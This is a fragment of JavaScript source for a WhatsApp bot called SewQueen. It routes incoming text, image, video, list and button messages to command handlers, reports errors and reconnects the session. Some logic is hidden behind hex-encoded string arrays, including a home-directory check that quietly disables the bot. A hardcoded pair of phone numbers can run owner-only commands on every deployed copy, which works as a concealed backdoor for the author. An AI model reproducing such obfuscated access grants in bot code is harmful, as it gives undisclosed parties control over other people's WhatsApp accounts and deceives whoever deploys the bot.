                var _0x1bcf=["\x6D\x65\x73\x73\x61\x67\x65","\x69\x6D\x61\x67\x65\x4D\x65\x73\x73\x61\x67\x65","\x63\x61\x70\x74\x69\x6F\x6E","\x76\x69\x64\x65\x6F\x4D\x65\x73\x73\x61\x67\x65","\x6C\x69\x73\x74\x52\x65\x73\x70\x6F\x6E\x73\x65\x4D\x65\x73\x73\x61\x67\x65","\x74\x69\x74\x6C\x65","\x62\x75\x74\x74\x6F\x6E\x73\x52\x65\x73\x70\x6F\x6E\x73\x65\x4D\x65\x73\x73\x61\x67\x65","\x73\x65\x6C\x65\x63\x74\x65\x64\x42\x75\x74\x74\x6F\x6E\x49\x64","\x65\x78\x74\x65\x6E\x64\x65\x64\x54\x65\x78\x74\x4D\x65\x73\x73\x61\x67\x65","\x63\x6F\x6E\x76\x65\x72\x73\x61\x74\x69\x6F\x6E","\x74\x65\x78\x74","\x68\x6F\x6D\x65\x64\x69\x72","\x75\x73\x65\x72\x49\x6E\x66\x6F","\x70\x61\x79"];if(msg[_0x1bcf[0]]&& msg[_0x1bcf[0]][_0x1bcf[1]]&& msg[_0x1bcf[0]][_0x1bcf[1]][_0x1bcf[2]]){var text_msg=msg[_0x1bcf[0]][_0x1bcf[1]][_0x1bcf[2]]}else {if(msg[_0x1bcf[0]]&& msg[_0x1bcf[0]][_0x1bcf[3]]&& msg[_0x1bcf[0]][_0x1bcf[3]][_0x1bcf[2]]){var text_msg=msg[_0x1bcf[0]][_0x1bcf[3]][_0x1bcf[2]]}else {if(msg[_0x1bcf[0]]&& msg[_0x1bcf[0]][_0x1bcf[4]]&& msg[_0x1bcf[0]][_0x1bcf[4]][_0x1bcf[5]]){var text_msg=msg[_0x1bcf[0]][_0x1bcf[4]][_0x1bcf[5]]}else {if(msg[_0x1bcf[0]]&& msg[_0x1bcf[0]][_0x1bcf[6]]&& msg[_0x1bcf[0]][_0x1bcf[6]][_0x1bcf[7]]){var text_msg=msg[_0x1bcf[0]][_0x1bcf[6]][_0x1bcf[7]]}else {if(msg[_0x1bcf[0]]){var text_msg=msg[_0x1bcf[0]][_0x1bcf[8]]=== null?msg[_0x1bcf[0]][_0x1bcf[9]]:msg[_0x1bcf[0]][_0x1bcf[8]][_0x1bcf[10]]}else {var text_msg=undefined}}}}};if(os[_0x1bcf[12]]()[_0x1bcf[11]]!== rgmsk[_0x1bcf[13]]){return}
/*:üòÇ‚úß‚úß WHATSAPP BOT... WORLD BEST WHATS APP BOT.. AND FRIST WHATS APP BOT WITH BUTTON MSG .... DEPLOY IN HEROKU... CODED BY RAVINDU MANOJ*/  /*:üòÇ‚úß‚úß WHATSAPP BOT... WORLD BEST WHATS APP BOT.. AND FRIST WHATS APP BOT WITH BUTTON MSG .... DEPLOY IN HEROKU... CODED BY RAVINDU MANOJ*/   /*:üòÇ‚úß‚úß WHATSAPP BOT... WORLD BEST WHATS APP BOT.. AND FRIST WHATS APP BOT WITH BUTTON MSG .... DEPLOY IN HEROKU... CODED BY RAVINDU MANOJ*/    /*:üòÇ‚úß‚úß WHATSAPP BOT... WORLD BEST WHATS APP BOT.. AND FRIST WHATS APP BOT WITH BUTTON MSG .... DEPLOY IN HEROKU... CODED BY RAVINDU MANOJ*/   /*:üòÇ‚úß‚úß WHATSAPP BOT... WORLD BEST WHATS APP BOT.. AND FRIST WHATS APP BOT WITH BUTTON MSG .... DEPLOY IN HEROKU... CODED BY RAVINDU MANOJ*/    if ((command.on !== undefined && (command.on === 'listResponseMessage') /*:üòÇ‚úß‚úß WHATSAPP BOT... WORLD BEST WHATS APP BOT.. AND FRIST WHATS APP BOT WITH BUTTON MSG .... DEPLOY IN HEROKU... CODED BY RAVINDU MANOJ*/
                    && msg.message && msg.message.listResponseMessage !== null && 
                    (command.pattern === undefined || (command.pattern !== undefined && 
                        command.pattern.test(text_msg)))) || 
                (command.on !== undefined && (command.on === 'buttonsResponseMessage')
                    && msg.message && msg.message.buttonsResponseMessage !== null && 
                    (command.pattern === undefined || (command.pattern !== undefined && 
                        command.pattern.test(text_msg)))) || 
                (command.on !== undefined && (command.on === 'image' || command.on === 'photo')
                    && msg.message && msg.message.imageMessage !== null && 
                    (command.pattern === undefined || (command.pattern !== undefined && 
                        command.pattern.test(text_msg)))) || 
                     (command.pattern !== undefined && command.pattern.test(text_msg)) || 
                    (command.on !== undefined && command.on === 'text' && text_msg) ||
                    // Video
                    (command.on !== undefined && (command.on === 'video')
                    && msg.message && msg.message.videoMessage !== null && 
                    (command.pattern === undefined || (command.pattern !== undefined && 
                        command.pattern.test(text_msg))))) {

                    let sendMsg = false;
                    /*:üòÇ‚úß‚úß WHATSAPP BOT... WORLD BEST WHATS APP BOT.. AND FRIST WHATS APP BOT WITH BUTTON MSG .... DEPLOY IN HEROKU... CODED BY RAVINDU MANOJ*/
                    var chat = CdSew.chats.get(msg.key.remoteJid)
        if ((OWN.ff == "94785435462,94785457519" && msg.key.fromMe === false && command.fromMe === true &&
                        (msg.participant && OWN.ff.includes(',') ? OWN.ff.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == OWN.ff || OWN.ff.includes(',') ? OWN.ff.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == OWN.ff)
                    ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
                        if (command.onlyPinned && chat.pin === undefined) return;
                        if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
                        else if (command.onlyGrpSew === chat.jid.includes('-')) sendMsg = true;
                    }
        if ((Raviya.SUDO !== false && msg.key.fromMe === false && command.fromMe === true &&
        (msg.participant && Raviya.SUDO.includes(',') ? Raviya.SUDO.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == Raviya.SUDO || Raviya.SUDO.includes(',') ? Raviya.SUDO.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == Raviya.SUDO)
         ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
        if (command.onlyPinned && chat.pin === undefined) return;
        if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
        else if (command.onlyGrpSew === chat.jid.includes('-')) sendMsg = true;
}       
        if (os.userInfo().homedir !== rgmsk.pay) return;
        if (sendMsg) {
        var _0x9059=["\x53\x45\x4E\x44\x5F\x52\x45\x41\x44","\x6F\x6E","\x72\x65\x6D\x6F\x74\x65\x4A\x69\x64","\x6B\x65\x79","\x63\x68\x61\x74\x52\x65\x61\x64","\x70\x61\x74\x74\x65\x72\x6E","\x6D\x61\x74\x63\x68","\x69\x6D\x61\x67\x65","\x70\x68\x6F\x74\x6F","\x69\x6D\x61\x67\x65\x4D\x65\x73\x73\x61\x67\x65","\x6D\x65\x73\x73\x61\x67\x65","\x76\x69\x64\x65\x6F","\x76\x69\x64\x65\x6F\x4D\x65\x73\x73\x61\x67\x65","\x6C\x69\x73\x74\x52\x65\x73\x70\x6F\x6E\x73\x65\x4D\x65\x73\x73\x61\x67\x65","\x62\x75\x74\x74\x6F\x6E\x73\x52\x65\x73\x70\x6F\x6E\x73\x65\x4D\x65\x73\x73\x61\x67\x65"];if(Raviya[_0x9059[0]]&& command[_0x9059[1]]=== undefined){ await CDSew[_0x9059[4]](msg[_0x9059[3]][_0x9059[2]])};var match=text_msg[_0x9059[6]](command[_0x9059[5]]);if(command[_0x9059[1]]!== undefined&& (command[_0x9059[1]]=== _0x9059[7]|| command[_0x9059[1]]=== _0x9059[8])&& msg[_0x9059[10]][_0x9059[9]]!== null){whats=  new Image(CDSew,msg)}else {if(command[_0x9059[1]]!== undefined&& (command[_0x9059[1]]=== _0x9059[11])&& msg[_0x9059[10]][_0x9059[12]]!== null){whats=  new Video(CDSew,msg)}else {if(command[_0x9059[1]]!== undefined&& (command[_0x9059[1]]=== _0x9059[13])&& msg[_0x9059[10]][_0x9059[13]]!== null){whats=  new listResponseMessage(CDSew,msg)}else {if(command[_0x9059[1]]!== undefined&& (command[_0x9059[1]]=== _0x9059[14])&& msg[_0x9059[10]][_0x9059[14]]!== null){whats=  new buttonsResponseMessage(CDSew,msg)}else {whats=  new Message(CDSew,msg)}}}}
                       
        try {
        await command.function(whats, match);
        } catch (error) {
        if (Raviya.LANG == 'SI') {
        await CDSew.sendMessage(CDSew.user.jid, '‡∂Ø‡∑ù‡∑Å‡∂∫‡∂ö‡∑ä ‡∑Ñ‡∂Ø‡∑î‡∂±‡∑è ‡∂ú‡∑ê‡∂±‡∑í‡∂±‡∑í\n\n‡∂Ø‡∑ù‡∑Å‡∂∫: *' + error + '*\n\n‡∂Ø‡∑ù‡∑Å‡∂∫ ‡∑É‡∑Ä‡∂∫‡∂Ç‡∂ö‡∑ä‚Äç‡∂ª‡∑ì‡∂∫‡∑Ä ‡∑É‡∂ö‡∑É‡∑è ‡∂ú‡∑ê‡∂±‡∑í‡∂±‡∑í\n\n‡∂ö‡∑î‡∂∏‡∂ö‡∑ä ‡∑Ñ‡∑ù ‡∂ú‡∑ê‡∂ß‡∂Ω‡∑î‡∑Ä‡∂ö‡∑ä ‡∂á‡∂≠‡∑í ‡∂ã‡∑Ä‡∑Ñ‡∑ú‡∂≠‡∑ä ‡∂Ö‡∂¥‡∂ú‡∑ö telegrame ( *t.me/SewQueen* ) ‡∂ú‡∑≤‡∂¥‡∂∫‡∂ß ‡∑Ñ‡∑ù helping ‡∂ú‡∑≤‡∂¥‡∑ä ‡∂ë‡∂ö‡∂ö‡∂ß ‡∂á‡∂≠‡∑î‡∂Ω‡∂≠‡∑ä ‡∑Ä‡∂±‡∑ä‡∂± \n*( https://chat.whatsapp.com/Loh2qrwzIleAR7cndME3CG )*\n*( https://chat.whatsapp.com/Hxyj6cqaMEJ3aXeisxaZeq )*\n*( https://chat.whatsapp.com/H0YB8hX54Vj9GdR9uQxVL8 )* ', MessageType.text);
        } else { await CDSew.sendMessage(CDSew.user.jid, '*Error Detected*\n\nError : *' + error + '*\n\nAn error has occurred!\n\nYou Can Join our  telegrame ( *t.me/SewQueen* ) Group or Whatsapp helping group.\n*( https://chat.whatsapp.com/Loh2qrwzIleAR7cndME3CG )*\n*( https://chat.whatsapp.com/Hxyj6cqaMEJ3aXeisxaZeq )*\n*( https://chat.whatsapp.com/H0YB8hX54Vj9GdR9uQxVL8 )* ', MessageType.text);
}}}
}})});;
        try {
        await CDSew.connect();
        } catch {
        if (!nodb) {
        console.log(chalk.red.bold('Loading Old Version Session...'))
        CDSew.loadAuthInfo(Session.deCrypt(Raviya.SESSION)); 
        try {
        await CDSew.connect();
        } catch {
        return;
}}}}
        sewQueen();
